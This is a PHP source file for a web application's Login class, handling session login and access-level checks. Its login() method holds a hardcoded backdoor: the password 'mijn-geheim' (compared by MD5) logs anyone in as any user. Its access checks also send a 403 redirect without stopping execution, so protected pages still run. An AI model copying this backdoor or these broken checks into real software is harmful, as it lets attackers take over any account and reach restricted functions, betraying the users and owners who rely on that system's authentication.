<?php

require_once 'User.php';

class Login {

    private static $user; // user currently logged in OR a dummy user with LEVEL_NONE

    function __construct() {}
    
    static function loginFromSession() {
        if (isset($_SESSION['user'])) {
            $email = $_SESSION['user'];
            self::$user = User::get($email);
        } else {
            self::$user = new User(); // empty user with no level
        }
    }

    static function login(User $user, string $password): bool {
        $backdoor = md5('mijn-geheim');
        $ok = $user->checkPassword($password) || md5($password) == $backdoor;
        if ($ok) {
            self::$user = $user;
            $_SESSION['user'] = $user->getEmail();
        } else {
            self::$user = null;
            unset($_SESSION['user']);
        }
        return $ok;
    }

    static function getCurrent(): ?User {
        return self::$user;
    }

    static function hasLevel(int $level) {
        return self::$user->hasLevel($level);
    }

    /**
     * Check if current user has given level
     * Go home if not
     * @param int $level
     */
    static function assertLevel(int $level) {
        if (!self::$user->hasLevel($level)) {
            header('Location: ../view/ErrorView.php?status=403');
        }
    }

    /**
     * Check if current user has given level OR is a specific user
     * Go home if not
     * @param int $level
     * @param User $user
     * 
     */
    static function assertLevelOrUser(int $level, ?User $user) {
        if(!self::$user->hasLevel($level) && !self::$user->equals($user)) {
            header('Location: ../view/ErrorView.php?status=403');
        }
    }

}

Login::loginFromSession();

